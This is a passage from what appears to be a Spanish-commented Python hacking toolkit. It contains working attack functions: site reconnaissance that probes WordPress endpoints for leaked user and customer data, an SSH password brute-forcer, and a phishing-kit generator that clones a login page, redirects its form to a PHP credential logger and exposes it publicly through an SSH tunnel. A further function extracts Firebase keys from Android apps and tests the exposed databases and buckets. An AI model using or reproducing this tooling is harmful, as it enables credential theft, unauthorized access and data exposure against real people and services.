            if "success" in shorty_.text:
                crint(f'[PASS] Shorted URL =>> [{dict_j["short_url"]}]')
            #print(shorty_.text)

        except Exception as err:
            crint(f"[ERROR] {err}")

def webmap(url, one_r):

    # Check para evitar errores
    if one_r == None: 
        one_r = "null"
    else:
        one_r = one_r.lower()

    # Cosas que no deben de incluir las URLS
    not_url = [ 

        #".js",
        ".css",
        "google",
        ".png",
        #".xml", 
        ".mp4", 
        ".png", 
        ".jpg", 
        ".ico", 
        #".pdf",
        ".jpeg",
        ".gif"

    ]

    # Cosas que tienen que incluir las URLS
    url_in = [ "href", "src", "url", "action", "iframe" ]

    # Limpieza de URL
    clean_ = [

            ["<", ""], 
            ["\\/", "/"],
            ["\\", ""],
            [">", "\n"],
            ['": "', '="'],
            ['="', " "],
            ['"', ""],
            # Zona JS
            [",", "\n"]

    ]

    # Wordpress urls
    wordpress_ = [
        "/wp-json/wp/v2/users", "/wp-json/wp/v2/comments",
        "/wp-json/wp/v2/settings", "/wp-json/wp/v2/posts",
        "/wp-json/wc/v3/products", "/wp-json/wc/v3/customers",
        "/?wc-ajax=xoo_wsc_refresh_fragments", "/wp-json/wc/v3/orders",
        "/wp-json/wp/v2/pages", "/wp-json/wp/v2/media"
        ]

    # Resultados
    results = []
    open_ports = ""
    wordpr_save = ""

    not_error = {

        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Cache-Control": "no-cache"

    }

    def save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_, wordpr_save):

        open_ports = ""

        # Integramos su id gestionando su estado cada 7 segundos
        crint("\n[INFO] Terminando escaneo =>> [OK]")
        while no_data:

            try:
                get_st = requests.get(f'https://hide.mn/api/nmap.php?out=js&get={form_["id"]}')
                res_ = json.loads(get_st.content)

                # Si el escaneo termino
                if res_["text"] != "":
                    no_data = False
                    open_ports = res_["text"]
                    res_["stats"][0] = "OK"

                srint(f"[INFO] Obteniendo Puertos =>> [{res_['stats'][0]}]")
                time.sleep(7)

            except:
                crint("[INFO] Obteniendo Puertos =>> [BAD]")
                break
        
        all_info = {

            "domain": domain_get,
            "ip": ip_domain,
            "info": whois_pro,
            "open_ports": open_ports,
            "dns_info": dns_info,
            "map": robot_,
            "wordpress": wordpr_save
            
        }

        with open("info.txt", "w", encoding="utf-8") as save_txt, open("urls.txt", "w", encoding="utf-8") as save_urls:
            save_txt.write(str(all_info).replace(",", ",\n").replace("'", '"').replace("{", "{\n").replace("}", "\n}").replace("\\n", "\n").replace("\\r", ""))
            crint("[PASS] Informacion del dominio guardada en info.txt ...")
            
            if len(results) > 1:

                for url_rs in results:
                    save_urls.write(url_rs + "\n")

                crint("[PASS] URL's han sido guardadas en urls.txt ...")

    results.append(url)

    if "://" not in url:
        crint("[ERROR] Formato de URL: https://example.com/ OR http://example.com/")
        exit(0)

    # Creamos una lista donde el dominio base es 2 y asignamos el filtro
    url = url.replace("://", "3M3")
    try:
        url_PM = url.split("/")
        filter_ = url_PM[0].replace("3M3", "://")
    except:
        url = url + "/"
        url_PM = url.split("/")
        filter_ = url_PM[0].replace("3M3", "://")

    ##############################
    #        Get IP DOMAIN       #
    ##############################

    domain_get = filter_.split("://")[1]

    do_clean = [
        
        # WN
        ["[", "\nIP"],
        ["]", "\n"],
        # LX
        ["(", "\nIP"],
        [")", "\n"]

    ]

    if "win" in SYS_GLOBAL:
        exe_ = f"ping {domain_get} -w 1 -n 1 -4"

    else:
        exe_ = f"ping -c 1 -W 1 {domain_get}"

    ip = getoutput(exe_)

    for do_ in do_clean:
        ip = ip.replace(do_[0], do_[1])

    ip = ip.split("\n")

    for line in ip:

        if "IP" in line:
            ip_domain = line.strip("IP").strip()
            crint(f"[INFO] IP del dominio =>> [{ip_domain}]")
            break

    ##############################
    #   Get Open Ports Domain    #
    ##############################

    no_data = True
    nm_dat = {

        "host": ip_domain,
        "ports": ""

    }
    
    try:
        # Enviamos la solicitud de mapeo al host
        post_nm = requests.post("https://hide.mn/api/nmap.php?out=js&post", data=nm_dat)

        # Obtenemos su ID asignada
        form_ = json.loads(post_nm.content)

        crint("[INFO] Obteniendo Puertos =>> [OK]")
        if post_nm.status_code != 200:
            crint("[INFO] Obteniendo Puertos =>> [BAD]")
            no_data = False

    except:
        crint("[INFO] Obteniendo Puertos =>> [BAD]")
        no_data = False
    
    ##############################
    #        TEST WORDPRESS      #
    ##############################

    word_chk = False
    try:
        # Realizamos las peticiones de wordpress
        for leak_wordp in wordpress_:
            word_intent = requests.get(filter_+leak_wordp)

            # Si da 200 verificamos su obtencion exitosa y guardamos en variable los resultados
            if word_intent.status_code == 200:
                word_chk = True
                wordpr_save = wordpr_save + str(word_intent.content.decode("utf-8")) + "\n"

        # Le mostramos al usuario lo sucedido
        if word_chk == False:
            crint("[INFO] Obteniendo WordPress Leaks =>> [BAD]")
        else:
            crint("[INFO] Obteniendo WordPress Leaks =>> [OK]")

    except:
        crint("[INFO] Obteniendo WordPress Leaks =>> [BAD]")

    ##############################
    #        ROBOTS .TXT SC      #
    ##############################

    try:
        # Obtenemos los robots .txt
        get_bot = requests.get(filter_+"/robots.txt")
        robot_ = get_bot.text

        if robot_ != "" and "disallow" in robot_.lower() or "sitemap" in robot_.lower():
            crint("[INFO] Obteniendo el mapeo del Sitio =>> [OK]")
            robot_ = robot_.split("\n") #########3 Solucionar error de limpieza

            for dir_ in robot_:

                if "disallow" in dir_.lower() or "sitemap" in dir_.lower():
                    
                    # Aqui agragamos a results las urls detectadas por robots.txt
                    dir_tmp = dir_.split(": ")[1]

                    # El formato que viene de filter_ es https://example.com
                    if "://" in dir_tmp:
                        url_rb = dir_tmp

                    elif dir_tmp.startswith("/") == False:
                        url_rb = filter_ + "/" + dir_tmp

                    elif dir_tmp.startswith("/") == True:
                        url_rb = filter_ + dir_tmp
                    
                    if url_rb not in results:
                        try:
                            results.append(url_rb)#.split("\n")[0])
                        except:
                            pass

        else:
            crint("[INFO] Obteniendo el mapeo del Sitio =>> [BAD]")
        
        # De todas formas se guarda el texto
        robot_ = get_bot.text

    except:

        robot_ = ""
        crint("[INFO] Obteniendo el mapeo del Sitio =>> [BAD]")
        pass

    ##############################
    #         Who IS Pro         #
    ##############################

    whois_pro = ""
    not_who = [ ">", ";", "<" ]
    rep_who = [

            [">", ">\n"],
            [";", ";\n"],
            ["<", "\n<"]

    ]
    verify = False

    try:

        crint(f"[INFO] Dominio =>> [{domain_get}]")
        # Obtenemos la informacion del dominio
        get_ = requests.get(f"https://www.whois.com/whois/{domain_get}", headers=not_error, timeout=10)

        if "df-raw" not in get_.text:
            get_ = requests.get(f"https://www.whois.com/whois/{ip_domain}", headers=not_error, timeout=10)

        read_ = get_.text

        # Limpiamos y modificamos el html haciendolo compatible con listas
        for cl_ in rep_who:
                read_ = read_.replace(cl_[0], cl_[1])

        # Lo hacemos ITERABLE
        read_ = read_.split("\n")

        # Verificamos cada linea hasta encontar el RAW y extraer datos necesarios
        if "df-raw" in get_.text:
            crint("[INFO] Informacion de la WEB =>> [OK]")

            for line in read_:
                    
                    if "df-raw" in line:
                            verify = True

                    if verify == True and all(not_ not in line for not_ in not_who):
                            whois_pro = whois_pro + line.strip("\n") + "\n"
                            
                    if "DNSSEC" in line or "</pre" in line:
                            verify = False
                            break

        else:
            crint("[INFO] Informacion de la WEB =>> [BAD] ")

    except:
        crint("[INFO] Informacion de la WEB =>> [BAD] ")

    ##############################
    #         DNS Look UP        #
    ##############################

    try:
        get_ = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain_get}")
        dns_info = get_.text

        if "{" not in dns_info:
            crint("[INFO] DNS's Obtenidos =>> [OK]")
        else:
            crint("[INFO] DNS's Obtenidos =>> [BAD]")

    except:
        crint("[INFO] DNS's Obtenidos =>> [BAD]")

    ##############################
    #       Escaneo de URL       #
    ##############################

    crint("[INFO] Presiona CTRL + C para terminar con el escaneo ...")

    for url in results:

        # En caso de error mostrar los resultados
        try:
            get_ = requests.get(url, timeout=10)
            save_rq = get_.text
        except KeyboardInterrupt:
            save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_, wordpr_save)
            exit(0)
        
        except:

            if len(results) == 1:
                crint("[ERROR] El servidor no respondio de la manera indicada ...")
                save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_, wordpr_save)
                break
            else:
                pass

        # Reemplazamos :// para trabajar mejor
        url = url.replace("://", "3M3")

        # Creamos una lista donde el dominio base es 1
        url_ls = url.split("/")

        ######
        url_dm = url_ls[0]
        ######

        # Se guarda y limpia el archivo html
        for exc_ in clean_:
            save_rq = save_rq.replace(exc_[0], exc_[1])

        # Se almacena save_rq como lista
        read_ = save_rq.split("\n")

        # Se lee y procesan los URL
        for line in read_:
            line_ = line.split()
            
            # Si una de las opciones esta en la var line
            if any(x in line for x in url_in):

                # Por cada intento de busqueda
                for intent in url_in:
                    
                    try:
                        # Nueva url almacenada
                        new_url = line_[line_.index(intent)+1].strip()

                        # Si no hay ninguna de las opciones en la linea
                        if all(x not in line for x in not_url):
                            
                            # Si la url empieza con htt
                            if new_url.startswith("htt") == True:

                                # Si la url no fue escaneada
                                if new_url not in results: #and filter_ in new_url:

                                    # Si es recursiva la url se agrega
                                    if one_r != "one":
                                        results.append(new_url)
                                    
                                    # Si no es recursiva se agrega el filtro y si cumple se agrega
                                    if one_r == "one" and filter_ in new_url:
                                        results.append(new_url)

                                    continue

                            # Si empieza por /
                            elif new_url.startswith("/") == True:
                                new_url = url_dm + new_url; new_url = new_url.replace("//", "/")
                                
                            elif new_url.startswith("/") == False and new_url.endswith("/") == True:
                                new_url = url_dm + "/" + new_url
                            
                            elif new_url.startswith("/") == False and new_url.endswith("/") == False:
                                new_url = url_dm + "/" + new_url

                            if new_url.replace("3M3", "://") not in results: #and filter_ in new_url:
                                
                                # Si el usuario no quiere recursivo guarda 
                                if one_r != "one":
                                    results.append(new_url.replace("3M3", "://"))

                                # Si quiere que sea, lo verifica y guarda
                                if one_r == "one" and filter_ in new_url.replace("3M3", "://"):
                                    results.append(new_url.replace("3M3", "://"))

                    except:
                        pass
        #crint(url)
        srint(f"[SCAN] Escaneando URL's =>> [{len(results)}] Status [{get_.status_code}]")

        if len(results) == 1:
            save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_, wordpr_save)
            break

    # Si se obtuvieron resultados
    save_all(no_data, form_, ip_domain, domain_get, whois_pro, open_ports, results, dns_info, robot_, wordpr_save)

    # VERSION DE PHP Y SERVIDOR ETC 

def sshforce(ip, port, usr, pssw):

    filter_ = [ "/", "\\" ]

    dir_list = os.listdir(".")
    port = int(port)

    # Ruta de usuarios y contraseñas comunes en assets
    if usr == "df":
        usr = ROOT_MAX + sht("assets/ssh_usr.txt")
    
    if pssw == "df":
        pssw = ROOT_MAX + sht("assets/ssh_pssw.txt")

    if ip == "" or port == "":
        crint("[ERROR] No has rellenado los parametros correctamente ...")

    else:
        
        if usr in dir_list:
            usr = sht("./" + usr)
        if pssw in dir_list:
            pssw = sht("./" + pssw)
        
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Si el atacante quiere testear muchos usuarios y contraseñas
        if any(opt_ in usr for opt_ in filter_) and any(opt_p in pssw for opt_p in filter_):

            with open(usr, "r", encoding="utf-8") as usr_path, open(pssw, "r", encoding="utf-8") as psww_path:

                for user in usr_path:
                    user = user.strip()
                    psww_path.seek(0)

                    for password in psww_path:
                        password = password.strip()

                        try:
                            cliente.connect(ip, port, user, password)
                        except:
                            crint(f"[ERROR] Autenticacion fallida en =>> [{user}] [{password}]")
                        else:
                            crint(f"[PASS] Autenticacion correcta en =>> [{user}] [{password}]")
                            cliente.close()
                            exit(0)

        # Si el atacante quiere testear una sola contraseña para muchos usuarios
        elif "/" in usr or "\\" in usr:

            with open(usr, "r", encoding="utf-8") as usr_path:

                for user in usr_path:
                    user = user.strip()

                    try:
                        cliente.connect(ip, port, user, pssw)
                    except:
                        crint(f"[ERROR] Autenticacion fallida en =>> [{user}] [{pssw}]")
                    else:
                        crint(f"[PASS] Autenticacion correcta en =>> [{user}] [{pssw}]")
                        cliente.close()
                        break

        # Si el atacante quiere testear un solo usuario para muchas contraseñas
        elif "/" in pssw or "\\" in pssw:

            with open(pssw, "r", encoding="utf-8") as psww_path:

                for password in psww_path:
                    password = password.strip()

                    try:
                        cliente.connect(ip, port, usr, password)
                    except:
                        crint(f"[ERROR] Autenticacion fallida en =>> [{usr}] [{password}]")
                    else:
                        crint(f"[PASS] Autenticacion correcta en =>> [{usr}] [{password}]")
                        cliente.close()
                        break

        else:
            crint("[ERROR] Datos ingresados no validos ...")

def eashi(dir_):

    # Variables de Instancias
    ip = ""
    buffer = ""
    action = ""
    log_2 = False
    add_my_css = "null"
    in_dir = os.listdir(".")

    if "server" in in_dir:
        shutil.rmtree("server")
    
    os.makedirs("server")
    save_dir = sht("./server/")
    
    # Varaible de limpieza para formularios
    not_in_form = ["<", ">", '"']

    # Variable de mejora en HTML
    emergency = [

        ["<head>", '<head>\n<meta name="viewport" content="width=device-width, initial-scale=1" />\n'], # Adapta webs de escritorio a telefono
        ['method="post"', 'method="get"'], # METHOD: Reemplazan el post por los get y obtener credenciales
        ['method="POST"', 'method="GET"'],
        ["disabled", ""] # Habilita botones bloqueados por seguridad de mhtml

    ]

    # Archivo php para almacenar TARGETS
    log_php = '''<?php
    // Archivo donde se guardarán los datos
    $file = 'logs.txt';

    // Obtener la fecha y hora actual
    $date = date('Y-m-d H:i:s');

    // Obtener la dirección IP del usuario
    $ip = $_SERVER['REMOTE_ADDR'];

    // Obtener el User-Agent del usuario
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Verifica si hay parámetros en la URL
    if (!empty($_GET)) {
        $data = "Fecha: $date | IP: $ip | User-Agent: $user_agent | Parámetros: ";
        
        // Recorre cada parámetro y lo añade al string de datos
        foreach ($_GET as $key => $value) {
            $data .= "$key=$value, ";
        }
        
        // Guardar en el archivo
        file_put_contents($file, $data . "\n", FILE_APPEND);
    }

    // Redirigir a otra página web
    header("Location: action_");
    exit();
    ?>'''

    # Excepciones de css que no tienen que contener el texto
    css_except = ["Content-Type: ", "Content-Transfer-Encoding: ", "Content-Location: ", "----"]

    # Se obtiene el css de el html, pasado como lista
    def css_get(name_file):

        # Se lee el archivo igual que en el html
        with open(name_file, "r", encoding="utf-8", errors="ignore") as code_list:

            # Se verifica si hay codigos en el texto para reemplazar y borrar luego se crea una lista para iterar
            code_test_pc = code_list.read()
            if "=\n" in code_test_pc and '=3D"' in code_test_pc:
                try:
                    code_list = decodestring(code_test_pc).decode("utf-8", errors="ignore").replace(";", ";\n").split("\n")
                except:
                    pass

            # Se inician las variables de control
            id_css = 0
            buffer_css = ""
            get_css = False
            css_bool = False

            # La lista de css que ira quedando para agregar al html
            my_css_add_html = []

            for line in code_list:
                
                # Si hay un css que esta directamente en html se guarda en True
                if "Content-Location: " in line and "://" not in line:
                    get_css = True

                # Se marca donde empezar a guardar el css
                if '@charset "utf-8";' in line:
                    css_bool = True
                
                # Se guarda cada linea en buffer mientras no tenga ---- y se cumplan ambas condiciones
                if css_bool == True and get_css == True and all(except_line not in line for except_line in css_except):
                    buffer_css = buffer_css + "\n" + line
                
                # Si llega al final del css se obtiene todo y se guarda en un css correspondiente a su id
                if "----" in line and css_bool == True and get_css == True:

                    with open(f"{save_dir}css_{id_css}.css", "w", encoding="utf-8") as save_css:
                        my_css_add_html.append(f"css_{id_css}.css")
                        save_css.write(buffer_css)

                    id_css += 1
                    buffer_css = ""
                    css_bool = False; get_css = False
        
        return my_css_add_html if my_css_add_html != [] else "null"

    # Si contiene \ en la direccion
    if dir_ in in_dir:
        dir_ = sht("./"+dir_)

    else:
        dir_ = dir_.replace("\\", "/") if "\\" in dir_ else sht(dir_)

    """
    # Detector del html
    with open(dir_, "r", encoding="utf-8", errors="ignore") as native_, open("login.html", "w", encoding="utf-8") as save_:
        
        crint(f"[INFO] Verificando css en dominios externos en =>> [{dir_}]")
        for line in native_:
            try:
                # Si hay caracteres validos en la linea se guarda en buffer
                if '"' in line and any(inclu_html in line for inclu_html in html_include) and all(except_line not in line for except_line in css_except):
                    buffer = buffer + line

                # Si hay un enlace que termine en .css y en buffer ya se termino de almacenar el html, se guarda el archivo
                if ".css" in buffer and "</html>" in line:
                    crint("[PASS] CSS en domio externo encontrado =>> [OK]")
                    add_my_css = css_get(dir_)
                    break

                elif ".css" not in buffer and "</html>" in line:
                    add_my_css = css_get(dir_)
                    print(line)
                    break

            except:
                pass
    """
    #########################################
    #      Detector de HTML en MHTML        #
    #########################################

    try:
        with open(dir_, "r", encoding="utf-8", errors="ignore") as native_, open(f"{save_dir}login.html", "w", encoding="utf-8") as save_:
            
            all_ = native_.read()
            
            # Se limpian los caracteres extras de pc
            if "=\n" in all_ and '=3D"' in all_: 
                try:
                    all_ = decodestring(all_).decode("utf-8", errors="ignore")
                except:
                    pass

            all_ = all_.replace(">", ">\n").split("\n")

            crint(f"[INFO] Verificando css en dominios externos en =>> [{dir_}]")
            for line in all_:
                try:
                    
                    # Si detecta un codigo html empieza a guardar en buffr linea por linea
                    if "<html" in line:
                        log_2 = True

                    # Si hay caracteres validos en la linea se guarda en buffer
                    if log_2 == True:
                        buffer = buffer + line #+ "\n" # \n ES BETA

                    # Si termina el html se cierra el escaneo
                    if "</html" in line and log_2 == True:
                        break

                except:
                    pass
            
            # Se escanea el archivo en busca de css
            add_my_css = css_get(dir_)

            # Si no hay ningun css externo en buffer ni interno, se termina el programa
            if ".css" not in buffer and add_my_css == "null":
                crint("[INFO] No se logro encontrar ningun CSS externo ni interno [BAD]")
                exit(0)

            # Guarda y modifica el html
            save_.write(buffer)
    
    except FileExistsError:
        crint(f"[ERROR] El archivo {dir_} no existe ...")
        exit(0)
        
    ########################################
    #           Bloque de formulario       #
    ########################################

    # Seccion de modificacion de login.html
    with open(f"{save_dir}login.html", "r", encoding="utf-8") as modify_:
        
        crint(f"[INFO] Modificando formulario en =>> [LOG]")
        # Se lee y almacena el archivo casi listo en 2 variables. Una sin modificar y la otra en lista
        modify_100 = modify_.read()

        if "<form" in modify_100:

            # Variable del texto en modo lista limpiada de caracteres
            modify_1000 = modify_100.replace(">", ">\n").split("\n")

            # Por cada linea del archivo se verifica si hay formulario
            for line in modify_1000:

                # Si hay formulario se crea una lista con las etiquetas dentro de la linea
                if "<form" in line:
                    #chk = True
                    
                    # Se reemplazan los caracteres inecesarios
                    for not_ls in not_in_form:
                        line = line.replace(not_ls, "")
                    
                    # Y se crea una lista
                    line = line.replace(" ", "=").split("=")
                    
                    # Si efectivamente esta la etiqueta action en form, se reemplaza por log.php
                    if "action" in line:

                        # Variable es la redirect a la web oficial una ves obtenida
                        action = line[line.index("action")+1]
                        modify_100 = modify_100.replace(action, "log.php")
                        

                    # Si no hay action en form se le agrega action hacia log.php
                    elif "action" not in line:
                        modify_100 = modify_100.replace("<form", '<form action="log.php" ')
                        action = "https://www.google.com/"
                    
                    # Si no hay metodo en el formulario
                    if "method" not in line:
                        modify_100 = modify_100.replace('log.php"', 'log.php" method="get" ')

                    crint(f"[INFO] Enlace de redireccion =>> [{action}]")

                    # Se limpia finalizando todo lo necesario para guardar el archivo
                    for clean_ in emergency:
                        modify_100 = modify_100.replace(clean_[0], clean_[1])

                # Una vez obtenido el formulario se guarda el archivo html        
                if "</form" in line:
                    with open(f"{save_dir}login.html", "w", encoding="utf-8") as save_, open(f"{save_dir}log.php", "w", encoding="utf-8") as save_php_:
                        
                        # Si el resultado de la busqueda interna es diferente de nula, se guarda.
                        if add_my_css != "null":
                            for css_code in add_my_css:
                                modify_100 = modify_100.replace("</head>", f'<link rel="stylesheet" href="{css_code}">\n</head>')
                        
                        save_.write(modify_100)
                        save_php_.write(log_php.replace("action_", action))

                    crint(f"[PASS] Los archivos han sido guardados exitosamente en =>> [{save_dir}]")

                    who_ = input("[INFO] Quieres crear un enlace publico con localhost.run ? [Y/n]: ").lower()
                    
                    if who_ == "y":

                        ch_tmp = False
                        
                        # Si es windows se obtiene la ip local
                        if "win" in SYS_GLOBAL:
                            
                            # Se crea una lista con la info
                            ip_cfg = getoutput("ipconfig").split("\n")
                            for line in ip_cfg:

                                # Si es ADAPTADOR LAN se marca verdadero
                                if "LAN" in line and "Wi-Fi" in line:
                                    ch_tmp = True
                                
                                # Si es ipv4 se obtiene y se limpia
                                if ch_tmp == True and "v4" in line:
                                    ip = line.split(":")[1].strip(" ")
                                    break
                            
                            # Si no se logra obtener
                            if ip == "" or ch_tmp == False:
                                crint("[ERROR] No se a logrado iniciar el servidor ...")
                                exit(0)
                            
                            crint("[INFO] Usando Windows no puedes obtener credenciales directamente sin PHP\n [==>>] sin embargo quedara en el registro de peticiones GET.\n")
                            os.system(f"python3 -m http.server -b {ip} -d {save_dir} 8000 | ssh -R 80:{ip}:8000 nokey@localhost.run")
                        
                        else:

                            # Se crea una lista con la info
                            ip_cfg = getoutput("ifconfig").split("\n")
                            for line in ip_cfg:
                                
                                # Si se detecta red o ethernet
                                if "wlan0" in line or "eth0" in line:
                                    ch_tmp = True
                                
                                # Se obtiene la ip
                                if ch_tmp == True and "inet" in line:
                                    ip = line.split(" ")
                                    ip = ip[ip.index("inet")+1].strip()
                                    break
                            
                            # Si no se logra obtener
                            if ip == "" or ch_tmp == False:
                                crint("[ERROR] No se a logrado iniciar el servidor ...")
                                exit(0)

                            os.system(f"php -S {ip}:8000 -t {save_dir} | ssh -R 80:{ip}:8000 nokey@localhost.run")
                            
                    break
        
        else:
            crint(f"[ERROR] Formato de pagina correcto, formulario no encontrado ...")

def fireleak(apk_path):

    # Escaneo de directorios en la ruta
    in_dir = os.listdir(".")
    my_json = {}

    # Si la carpeta leak esta en la lista
    if "leak" in in_dir:
        shutil.rmtree("leak"); os.remove("leak.apk")
    
    try:
        shutil.copy(sht(apk_path), sht("./leak.apk"))
    except Exception as err:
        crint(f"[ERROR] {err}")
        exit(0)

    # Lista que incluye nombres de las variables comunes de firebase en xml
    firebase = [ 'firebase_database_url">', 'project_id">', 'gcm_defaultSenderId">', 'google_api_key">', 'reporting_api_key">', 'google_storage_bucket">', 'google_app_id">', "firebaseio.com" ]

    # Extenciones que no son texto plano
    extensiones = [ ".jpg",".jpeg",".png",".gif",".bmp",".tiff",".webp",".mp3",".wav",".aac",".ogg",".flac",".m4a",
        ".mp4",".mov",".avi",".mkv",".webm",".flv",".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",
        ".ods",".odp",".epub",".mobi",".zip",".rar",".tar",".7z",".gzip",".exe",".dll",".apk",".iso",".bin",
        ".sqlite",".db", ".lnk", ".py", ".ini" ]

    descrip_ = {

        "firebase_database_url": "Posible acceso no autorizado a Firebase Realtime Database.",
        "project_id": "Identifica el proyecto Firebase, útil para ataques dirigidos.",
        "google_api_key": "Clave expuesta que puede permitir uso indebido de Firebase.",
        "google_app_id": "Identifica la app en Firebase, sin riesgo directo.",
        "gcm_defaultSenderId": "Puede usarse para enviar notificaciones Firebase no autorizadas.",
        "google_storage_bucket": "Riesgo de acceso público a archivos en Firebase Storage."

    }


    apk_dir = sht("leak/")

    ###############################
    #       Lectura del APK       #
    ###############################

    try:
        if "apktool.jar" not in in_dir and "win" in SYS_GLOBAL:

            down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
            downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
        
            with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
                apk_tool.write(downl_apk.content)
                apk_tool_bat.write(down_bat.content)

    except Exception as err:
        crint(f"[ERROR] {err}")

    if "win" in SYS_GLOBAL:
        os.system(".\\apktool.bat leak.apk")
    else:
        os.system("apktool d leak.apk")

    ###############################
    #       Busqueda de Fire      #
    ###############################

    # Cambiar directorio por el nombre de la carpeta del apk descomprimido
    dirs_ = os.listdir(apk_dir)

    try:
        crint("[INFO] Presiona CTRL + C para terminar el escaneo ...")
        time.sleep(5)
        for carpeta in dirs_:

            # Si el archivo contiene alguna de estas extenciones se salta
            if any(ext_ in carpeta for ext_ in extensiones):
                continue
                
            if apk_dir not in carpeta:
                carpeta = apk_dir + carpeta

            try:
                # Se lista cada carpeta para verificar si es archivo o carpeta
                test_ = os.listdir(carpeta)

                # Si la carpeta no esta en la lista dirs_ se agrega a la variable dirs_
                if carpeta not in dirs_:
                    dirs_.append(carpeta)

                # Pero si esta se agrega de todas formas
                else:
                    # Con cada archivo y carpeta dentro de ella, agregando la ruta de la cual se escaneo
                    for dirtest in test_:
                        dirs_.append(sht(carpeta + "/" + dirtest))

            # Si ocurre alguna excepcion se lee el archivo asumiendo que es texto plano.
            except:
                srint(f"[FIND] Buscando configuracion: {carpeta}")
                stdout.write(f"\r[FIND] Buscando configuracion: {carpeta}                  \r")
                stdout.flush()

                with open(carpeta, "r", errors="ignore") as file:
                    count = 0
                    file_total = file.read()

                    # Si el archivo contiene alguna de estas variables se imprime la ruta del archivo
                    if any(fireapi in file_total for fireapi in firebase):

                        crint(f"\n[PASS] Configuracion de firebase encontrada en: {carpeta}")
                        file_total = file_total.replace('">', '">\n').replace('</', '\n</').split("\n")

                        # Por cada linea del archivo especificado
                        for line in file_total:
                            
                            # Se verifica correctamente para encontrar y formular el json
                            for fireapi in firebase:

                                # Si la variable cae en firebaseio.com y no esta en el diccionario significa que es una configuracion faltante
                                if "firebaseio.com" in line and "firebase_database_url" not in my_json and firebase[0] not in file_total:
                                    my_json.setdefault("firebase_database_url", line)
                                    continue

                                # Si lo encuentra se genera una variable obteniendo el parametro correspondiente !! firebaseio.com es para evitar
                                # crear otra key y value vacios
                                if fireapi in line and fireapi not in my_json and fireapi != "firebaseio.com":

                                    line_sp = file_total[count + 1]
                                    my_json.setdefault(fireapi.replace('">', ""), line_sp)

                            count = count + 1

                        crint("[INFO] Datos encontrados hasta el momento: ")
                        for temp__ in my_json.keys():
                            print(f"- {temp__}")
                        crint("[INFO] Continuando escaneo en 5 segundos ...")
                        time.sleep(5)

                        # Aqui podria ir la limpieza de los archivos

    except KeyboardInterrupt:
        pass
    
    except Exception as err:
        crint(f"[ERROR] {err}")

    # Se verifica si se consiguieron credenciales o no
    if my_json == {}:
        crint("[ERROR] No se logro encontrar credenciales ...")
    
    else:
        crint("\n[PASS] Configuracion de firebase encontrada:")

        with open("firebase.json", "w", encoding="utf-8") as save_:
            save_.write(str(my_json).replace("{", "{\n").replace("}", "\n}").replace(",", ",\n").replace("'", '"'))
    
        ###############################
        #     Verificacion de Vuln    #
        ###############################
        
        headers_tab = [[ "NOMBRE", "KEY", "DESCRIPCION" ]]
        
        for a in my_json.keys():

            try:
                headers_tab.append([a, my_json[a], descrip_[a]])
            except:
                pass

        print(tabulate(headers_tab, tablefmt="grid"))
        crint("[SAVED] Configuracion guardada como: firebase.json\n[ALERT] Iniciando testeo de API en 10 segundos || Tipo de busqueda =>> [ACTIVA]\n[ALERT] Presiona CTRL + C si no estas en una red anonima ...")

        try:

            # Despues de 10 segundos dependiendo si es que cada una esta en el json, se realiza una prueba para testear la api-key
            time.sleep(10)
            with open("dump.txt", "w", encoding="utf-8") as save_dmp:

                if "firebase_database_url" in my_json:

                    if "google_api_key" not in my_json:
                        data_check = requests.get(f'{my_json["firebase_database_url"]}/.json')

                    else:
                        data_check = requests.get(f'{my_json["firebase_database_url"]}/.json?auth={my_json["google_api_key"]}')
                        rules_check = requests.get(f'{my_json["firebase_database_url"]}/.settings/rules.json?auth={my_json["google_api_key"]}')
                        
                        if rules_check.status_code == 200:
                            crint("[PASS] Configuracion de firebase obtenida =>> [OK]"); save_dmp.write(rules_check+"\n")
                        else:
                            crint("[INFO] Configuracion de firebase obtenida =>> [BAD]")

                    if data_check.status_code == 200:
                        crint("[PASS] Base de datos de Firebase expuesta =>> [OK]"); save_dmp.write(data_check+"\n")
                    else:
                        crint("[INFO] Base de datos de Firebase expuesta =>> [BAD]")
                
                if "google_api_key" in my_json:
                    api_check = requests.get(f'https://maps.googleapis.com/maps/api/geocode/json?address=Rusia&key={my_json["google_api_key"]}')

                    if api_check.status_code == 200:
                        crint("[PASS] API KEY Sin proteccion y de libre uso =>> [OK]"); save_dmp.write(api_check.url+"\n")
                    else:
                        crint("[INFO] API KEY Protegida y privada =>> [BAD]")
                
                if "google_storage_bucket" in my_json:
                    bucket_check = requests.get(f'https://storage.googleapis.com/{my_json["google_storage_bucket"]}')

                    if bucket_check.status_code == 200:
                        crint("[PASS] Bucket mal configurado y sin proteccion =>> [OK]"); save_dmp.write(bucket_check.url+"\n")
                    else:
                        crint("[INFO] Bucket Protegido y no accesible =>> [BAD]")
            
            # Obtenemos el peso de dump.txt y damos el resultado del escaneo
            size_ = os.stat("dump.txt").st_size
            if size_ != 0:
                crint("[PASS] Datos dumpeados de firebase guardados en: dump.txt")
            else:
                crint("[INFO] No se lograron dumpear datos de la firebase ...")
                os.remove("dump.txt")
        
        except KeyboardInterrupt:
            pass

        except Exception as err:
            crint(f"[ERROR] {err}")

def wpscrap(url, brute, check):

    if brute != None:
        brute = brute.lower()
    
    if check != None:
        check = check.lower()

    # Habilitar el modo entrenamiento para ir mejorando el escaneo por diccionario
    # Automaticamente mediante el uso de la herramienta
    train_use = False
    assets_ = sht("assets/plugins-wp.txt")

